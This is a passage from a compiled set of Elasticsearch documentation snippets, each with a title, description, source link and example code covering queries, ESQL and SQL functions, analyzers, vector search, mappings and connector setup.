 }\n}\n\nPUT my-index-000001/_bulk?refresh\n{ \"index\" : { \"_id\" : \"1\" } }\n{ \"date\": \"2015-01-01\" }\n{ \"index\" : { \"_id\" : \"2\" } }\n{ \"date\": \"2015-01-01T12:10:30.123456789Z\" }\n{ \"index\" : { \"_id\" : \"3\" } }\n{ \"date\": 1420070400000 }\n\nGET my-index-000001/_search\n{\n  \"sort\": { \"date\": \"asc\"},\n  \"runtime_mappings\": {\n    \"date_has_nanos\": {\n      \"type\": \"boolean\",\n      \"script\": \"emit(doc['date'].value.nano != 0)\"\n    }\n  },\n  \"fields\": [\n    {\n      \"field\": \"date\",\n      \"format\": \"strict_date_optional_time_nanos\"\n    },\n    {\n      \"field\": \"date_has_nanos\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Term Query on Text Field in Elasticsearch Console\nDESCRIPTION: This example demonstrates the usage of a term query on a text field in Elasticsearch using the console. It attempts to find the exact phrase 'Quick Brown Foxes!' in the 'full_text' field, illustrating the challenges when text analysis changes the field's contents. The query returns no results due to the lack of exact match post-analysis.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-term-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search?pretty\n{\n  \"query\": {\n    \"term\": {\n      \"full_text\": \"Quick Brown Foxes!\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying User Identity and Access Control for Source2 in Elasticsearch\nDESCRIPTION: This snippet shows how to retrieve user identity and access control information for a specific user from the .search-acl-filter-source2 index in Elasticsearch. It includes the user's email, username, and access control groups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\nGET .search-acl-filter-source2\n{\n  \"_id\": \"example.user@example.com\",\n  \"identity\": {\n      \"username\": \"example username\",\n      \"email\": \"example.user@example.com\"\n   },\n   \"query\": {\n        \"template\": {\n            \"params\": {\n                \"access_control\": [\n                    \"example.user@example.com\",\n                    \"source2-user-group\"]\n            }\n        },\n        \"source\": \"...\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Term Query in Elasticsearch Console\nDESCRIPTION: This snippet demonstrates how to perform a term query in Elasticsearch using the console. It retrieves documents where the 'user.id' field exactly matches the specified value 'kimchy', with a relevance boost parameter. No external dependencies are needed, and inputs must include a field name and the exact term to search. Outputs are documents matching the criteria. The term query is precise and does not analyze the query input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-term-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"term\": {\n      \"user.id\": {\n        \"value\": \"kimchy\",\n        \"boost\": 1.0\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Percentiles using PERCENTILE Function in Elasticsearch ESQL\nDESCRIPTION: This snippet demonstrates how to use the PERCENTILE function to calculate various percentiles of salary data from an 'employees' dataset. It calculates the 0th (minimum), 50th (median), and 99th percentiles of the salary field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS p0 = PERCENTILE(salary,  0)\n     , p50 = PERCENTILE(salary, 50)\n     , p99 = PERCENTILE(salary, 99)\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Using ESQL AVG Function\nDESCRIPTION: Demonstrates how to calculate the average value of the 'height' field from the 'employees' index using ESQL. The query uses the STATS command with AVG aggregation to compute the mean value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/avg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS AVG(height)\n```\n\n----------------------------------------\n\nTITLE: Basic Pipeline Processor Configuration in Elasticsearch\nDESCRIPTION: A simple configuration of the pipeline processor that references another pipeline named 'inner-pipeline'. This allows nesting pipelines for more complex data processing flows.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/pipeline-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"pipeline\": {\n    \"name\": \"inner-pipeline\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Unmapped Fields Configuration\nDESCRIPTION: Shows how to configure and retrieve unmapped fields using include_unmapped option in the fields parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"enabled\": false\n  }\n}\n\nPUT my-index-000001/_doc/1?refresh=true\n{\n  \"user_id\": \"kimchy\",\n  \"session_data\": {\n     \"object\": {\n       \"some_field\": \"some_value\"\n     }\n   }\n}\n\nPOST my-index-000001/_search\n{\n  \"fields\": [\n    \"user_id\",\n    {\n      \"field\": \"session_data.object.*\",\n      \"include_unmapped\" : true\n    }\n  ],\n  \"_source\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Querying geo_shape data with geo_distance filter in Elasticsearch\nDESCRIPTION: This snippet shows how to use the `geo_distance` filter to search for `geo_shape` values within a specified distance of a given geopoint in Elasticsearch. It uses a bool query with a `match_all` clause and a `geo_distance` filter to find documents within 200km of latitude 40 and longitude -70.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my_geoshapes/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"200km\",\n          \"pin.location\": {\n            \"lat\": 40,\n            \"lon\": -70\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Employee Salary Statistics using ESQL\nDESCRIPTION: This ESQL query analyzes employee salaries by categorizing them into three ranges: under 40K, between 40K and 60K, and over 60K. It uses the EVAL clause to convert salaries to thousands and the STATS clause to count employees in each category. The query also calculates the total number of employees.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/aggFilteringNoGroup.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL Ks = salary / 1000 // thousands\n| STATS under_40K = COUNT(*) WHERE Ks < 40,\n        inbetween = COUNT(*) WHERE 40 <= Ks AND Ks < 60,\n        over_60K  = COUNT(*) WHERE 60 <= Ks,\n        total     = COUNT(*)\n```\n\n----------------------------------------\n\nTITLE: Creating Dutch Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet presents how to implement a custom analyzer for the Dutch language in Elasticsearch. It features a combination of filters for stop words, keyword markers, and an optional stemming override for better text analysis results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPUT /dutch_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"dutch_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_dutch_\" <1>\n        },\n        \"dutch_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"voorbeeld\"] <2>\n        },\n        \"dutch_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"dutch\"\n        },\n        \"dutch_override\": {\n          \"type\":       \"stemmer_override\",\n          \"rules\": [\n            \"fiets=>fiets\",\n            \"bromfiets=>bromfiets\",\n            \"ei=>eier\",\n            \"kind=>kinder\"\n          ]\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_dutch\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"dutch_stop\",\n            \"dutch_keywords\",\n            \"dutch_override\",\n            \"dutch_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using MAX Function in Elasticsearch SQL\nDESCRIPTION: The MAX function returns the maximum value across input values in a specified numeric field, ignoring null values. For text or keyword fields, it behaves like the LAST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nMAX(field_name) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MAX(salary) AS max FROM emp;\n\n      max\n---------------\n74999\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MAX(ABS(salary / -12.0)) AS max FROM emp;\n\n       max\n-----------------\n6249.916666666667\n```\n\n----------------------------------------\n\nTITLE: DATE_ADD Example: Add Minutes\nDESCRIPTION: Demonstrates adding minutes to a date value using DATE_ADD with a positive integer. The example shows how to use DATE_ADD to increment a date by 9235 minutes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_26\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_ADD('minutes', 9235, '2019-09-04'::date) AS \\\"+9235 minutes\\\";\\n\\n      +9235 minutes\n------------------------\n2019-09-10T09:55:00.000Z\"\n```\n\n----------------------------------------\n\nTITLE: Example of LOG Function Usage\nDESCRIPTION: Demonstrates the LOG function by showing that LOG(EXP(3)) returns 3, verifying the inverse relationship between logarithmic and exponential functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nSELECT EXP(3), LOG(20.085536923187668);\n\n      EXP(3)      |LOG(20.085536923187668)\n------------------+-----------------------\n20.085536923187668|3.0\n```\n\n----------------------------------------\n\nTITLE: Multi-match with phrase_prefix Type\nDESCRIPTION: This snippet demonstrates the `phrase_prefix` type in a multi_match query. It searches for \"quick brown f\" in the \"subject\" and \"message\" fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"quick brown f\",\n      \"type\":       \"phrase_prefix\",\n      \"fields\":     [ \"subject\", \"message\" ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Vector Direct Access Implementation\nDESCRIPTION: Shows how to directly access vector values and implement custom similarity calculations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\" : {\n        \"bool\" : {\n          \"filter\" : {\n            \"term\" : {\n              \"status\" : \"published\"\n            }\n          }\n        }\n      },\n      \"script\": {\n        \"source\": \"\"\"\n          float[] v = doc['my_dense_vector'].vectorValue;\n          float vm = doc['my_dense_vector'].magnitude;\n          float dotProduct = 0;\n          for (int i = 0; i < v.length; i++) {\n            dotProduct += v[i] * params.queryVector[i];\n          }\n          return dotProduct / (vm * (float) params.queryVectorMag);\n        \"\"\",\n        \"params\": {\n          \"queryVector\": [4, 3.4, -0.2],\n          \"queryVectorMag\": 5.25357\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Nested Properties using Dot Notation in Elasticsearch\nDESCRIPTION: Shows how to query and aggregate nested properties using dot notation. The example includes a match query on manager name and a nested aggregation on employee ages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/properties.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"manager.name\": \"Alice White\"\n    }\n  },\n  \"aggs\": {\n    \"Employees\": {\n      \"nested\": {\n        \"path\": \"employees\"\n      },\n      \"aggs\": {\n        \"Employee Ages\": {\n          \"histogram\": {\n            \"field\": \"employees.age\",\n            \"interval\": 5\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using COUNT Function in ESQL\nDESCRIPTION: Shows the parameter syntax for the COUNT function in ESQL. The function can be used with a field expression to count specific values, or without parameters to count the number of rows (COUNT(*)).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/count.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`field`\n:   Expression that outputs values to be counted. If omitted, equivalent to `COUNT(*)` (the number of rows).\n```\n\n----------------------------------------\n\nTITLE: Combining geo_centroid with terms aggregation in Elasticsearch\nDESCRIPTION: This example shows how to use geo_centroid as a sub-aggregation to a terms bucket aggregation, finding the central location for museums in each city.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geocentroid-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"cities\": {\n      \"terms\": { \"field\": \"city.keyword\" },\n      \"aggs\": {\n        \"centroid\": {\n          \"geo_centroid\": { \"field\": \"location\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Multiple Decay Functions in Elasticsearch Function Score Query\nDESCRIPTION: This complete query example demonstrates how to combine both price and location decay functions using the multiply score mode. It searches for properties with balconies and adjusts scores based on both price and distance from town center.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"functions\": [\n        {\n          \"gauss\": {\n            \"price\": {\n              \"origin\": \"0\",\n              \"scale\": \"20\"\n            }\n          }\n        },\n        {\n          \"gauss\": {\n            \"location\": {\n              \"origin\": \"11, 12\",\n              \"scale\": \"2km\"\n            }\n          }\n        }\n      ],\n      \"query\": {\n        \"match\": {\n          \"properties\": \"balcony\"\n        }\n      },\n      \"score_mode\": \"multiply\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing KNN Retriever Search in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a k-nearest neighbor (knn) search using the KNN retriever in Elasticsearch. It specifies the vector field, query vector, number of neighbors, and candidate set size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /restaurants/_search\n{\n  \"retriever\": {\n    \"knn\": {\n      \"field\": \"vector\",\n      \"query_vector\": [10, 22, 77],\n      \"k\": 10,\n      \"num_candidates\": 10\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extended Stats with Missing Value Handling\nDESCRIPTION: Shows how to handle missing values in extended stats aggregation by specifying a default value for documents missing the target field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-extendedstats-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /exams/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"grades_stats\": {\n      \"extended_stats\": {\n        \"field\": \"grade\",\n        \"missing\": 0\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Hybrid Search with RRF Retriever in Elasticsearch\nDESCRIPTION: This example shows how to use the RRF (Reciprocal Rank Fusion) retriever for a hybrid search combining lexical search and dense vector search. It uses a standard retriever for text matching and a KNN retriever for vector similarity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /restaurants/_search\n{\n  \"retriever\": {\n    \"rrf\": {\n      \"retrievers\": [\n        {\n          \"standard\": {\n            \"query\": {\n              \"multi_match\": {\n                \"query\": \"Austria\",\n                \"fields\": [\n                  \"city\",\n                  \"region\"\n                ]\n              }\n            }\n          }\n        },\n        {\n          \"knn\": {\n            \"field\": \"vector\",\n            \"query_vector\": [10, 22, 77],\n            \"k\": 10,\n            \"num_candidates\": 10\n          }\n        }\n      ],\n      \"rank_constant\": 1,\n      \"rank_window_size\": 50\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Create Index API with custom analyzer using word_delimiter\nDESCRIPTION: This example demonstrates how to configure a custom analyzer using the `word_delimiter` filter in the Elasticsearch Create Index API. It defines a custom analyzer named `my_analyzer` that uses the `keyword` tokenizer and the `word_delimiter` filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [ \"word_delimiter\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Length Token Filter in Elasticsearch\nDESCRIPTION: Example of using the Length token filter through the analyze API to remove tokens longer than 4 characters. Uses whitespace tokenizer and applies length filter with min=0 and max=4.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-length-tokenfilter.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"length\",\n      \"min\": 0,\n      \"max\": 4\n    }\n  ],\n  \"text\": \"the quick brown fox jumps over the lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Bit vector search results in Elasticsearch\nDESCRIPTION: Shows the search results from a KNN query on bit vectors. The results include the document IDs, scores, and original vector values, with scores based on hamming distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_9\n\nLANGUAGE: console-result\nCODE:\n```\n{\n    \"hits\": {\n        \"hits\": [\n            {\n                \"_index\": \"my-bit-vectors\",\n                \"_id\": \"1\",\n                \"_score\": 1.0,\n                \"_source\": {\n                    \"my_vector\": [\n                        127,\n                        -127,\n                        0,\n                        1,\n                        42\n                    ]\n                }\n            },\n            {\n                \"_index\": \"my-bit-vectors\",\n                \"_id\": \"2\",\n                \"_score\": 0.55,\n                \"_source\": {\n                    \"my_vector\": \"8100012a7f\"\n                }\n            }\n        ]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating T-Shirt Sales Percentage Using Bucket Script Aggregation\nDESCRIPTION: Demonstrates a complex query using date_histogram, sum, filter, and bucket_script aggregations to calculate the percentage of t-shirt sales compared to total sales for each month. It showcases how to use nested aggregations and bucket paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-script-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"total_sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"t-shirts\": {\n          \"filter\": {\n            \"term\": {\n              \"type\": \"t-shirt\"\n            }\n          },\n          \"aggs\": {\n            \"sales\": {\n              \"sum\": {\n                \"field\": \"price\"\n              }\n            }\n          }\n        },\n        \"t-shirt-percentage\": {\n          \"bucket_script\": {\n            \"buckets_path\": {\n              \"tShirtSales\": \"t-shirts>sales\",\n              \"totalSales\": \"total_sales\"\n            },\n            \"script\": \"params.tShirtSales / params.totalSales * 100\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating API Key for PostgreSQL Connector\nDESCRIPTION: Security API endpoint for creating an API key with specific role descriptors and cluster permissions for a PostgreSQL connector\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing and Querying Arrays in Elasticsearch\nDESCRIPTION: Example demonstrating how to index documents containing arrays and perform queries. Shows different array types including string arrays, object arrays, and single values. Includes document indexing with PUT operations and a search query example.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/array.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"message\": \"some arrays in this document...\",\n  \"tags\":  [ \"elasticsearch\", \"wow\" ],\n  \"lists\": [\n    {\n      \"name\": \"prog_list\",\n      \"description\": \"programming list\"\n    },\n    {\n      \"name\": \"cool_list\",\n      \"description\": \"cool stuff list\"\n    }\n  ]\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"message\": \"no arrays in this document...\",\n  \"tags\":  \"elasticsearch\",\n  \"lists\": {\n    \"name\": \"prog_list\",\n    \"description\": \"programming list\"\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"tags\": \"elasticsearch\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Hour of Day with HOUR_OF_DAY in SQL\nDESCRIPTION: Extracts the hour of the day from a date/datetime expression. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_56\n\nLANGUAGE: sql\nCODE:\n```\n\"HOUR_OF_DAY(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT HOUR_OF_DAY(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS hour;\\n\\n     hour\\n---------------\\n10\\n\"\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Standard Mode in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index named 'my-index-000001' with the standard index mode setting in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/index-modules.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index\":{\n      \"mode\":\"standard\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Geo-bounding Box Using Lat Lon Property Format\nDESCRIPTION: The following request searches using a geo_bounding_box filter with latitude and longitude defined as properties. This method necessitates latitude and longitude in a key-value format and returns matching documents intersecting the bounding box defined.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": {\n              \"lat\": 40.73,\n              \"lon\": -74.1\n            },\n            \"bottom_right\": {\n              \"lat\": 40.01,\n              \"lon\": -71.12\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Using Nested Field Mapping\nDESCRIPTION: Complete example showing how to create an index with nested field mapping, index data, and perform nested queries that correctly maintain object independence. Demonstrates both matching and non-matching queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/nested.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"user\": {\n        \"type\": \"nested\" \n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"group\" : \"fans\",\n  \"user\" : [\n    {\n      \"first\" : \"John\",\n      \"last\" :  \"Smith\"\n    },\n    {\n      \"first\" : \"Alice\",\n      \"last\" :  \"White\"\n    }\n  ]\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"user\",\n      \"query\": {\n        \"bool\": {\n          \"must\": [\n            { \"match\": { \"user.first\": \"Alice\" }},\n            { \"match\": { \"user.last\":  \"Smith\" }} \n          ]\n        }\n      }\n    }\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"user\",\n      \"query\": {\n        \"bool\": {\n          \"must\": [\n            { \"match\": { \"user.first\": \"Alice\" }},\n            { \"match\": { \"user.last\":  \"White\" }} \n          ]\n        }\n      },\n      \"inner_hits\": { \n        \"highlight\": {\n          \"fields\": {\n            \"user.first\": {}\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Discovery Seed Hosts in Elasticsearch\nDESCRIPTION: Setting that provides a list of master-eligible node addresses in the cluster. Supports host:port format, IPv4, IPv6, and DNS hostnames. Default ports are determined by transport settings or fallback to 9300.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery.seed_hosts: [\"127.0.0.1\", \"[::1]\"]\n```\n\n----------------------------------------\n\nTITLE: Testing Elasticsearch API with cURL Commands\nDESCRIPTION: Example cURL commands demonstrating how to reproduce bugs in Elasticsearch, including deleting an index, inserting a document, and executing a test query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n# delete the index\ncurl -XDELETE localhost:9200/test\n\n# insert a document\ncurl -XPUT localhost:9200/test/test/1 -d '{\n \"title\": \"test document\"\n}'\n\n# this should return XXXX but instead returns YYY\ncurl ....\n```\n\n----------------------------------------\n\nTITLE: Querying and Sorting Employee Data with ESQL\nDESCRIPTION: This ESQL query retrieves data from the 'employees' table, sorts it by the 'emp_no' field in ascending order, and limits the result to 5 rows. It demonstrates the use of FROM, SORT, and LIMIT clauses in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/limit.csv-spec/basic.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| SORT emp_no ASC\n| LIMIT 5\n```\n\n----------------------------------------\n\nTITLE: Performing Lookup Join on Firewall Logs with Threat List in ESQL\nDESCRIPTION: This ESQL query retrieves data from firewall_logs and performs a lookup join with a threat_list table using the source IP as the join key. This allows for enriching firewall log data with threat intelligence information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs-lookup-join.csv-spec/lookupJoinSourceIp.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM firewall_logs\n| LOOKUP JOIN threat_list ON source.IP\n```\n\n----------------------------------------\n\nTITLE: Subtraction Operator in Elasticsearch SQL\nDESCRIPTION: Shows how to use the subtraction operator (-) to find the difference between two numeric values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-math.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 1 - 1 AS x;\n```\n\n----------------------------------------\n\nTITLE: Executing Rate Aggregation with Runtime Mappings in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the rate aggregation with a runtime field for price adjustment. It calculates the average adjusted price per month using a date histogram and rate aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"price.adjusted\": {\n      \"type\": \"double\",\n      \"script\": {\n        \"source\": \"emit(doc['price'].value * params.adjustment)\",\n        \"params\": {\n          \"adjustment\": 0.9\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"by_date\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"avg_price\": {\n          \"rate\": {\n            \"field\": \"price.adjusted\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index Mapping\nDESCRIPTION: Creates an index with a keyword field mapping for filter context testing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field\": {\n        \"type\": \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Semantic Search Query in 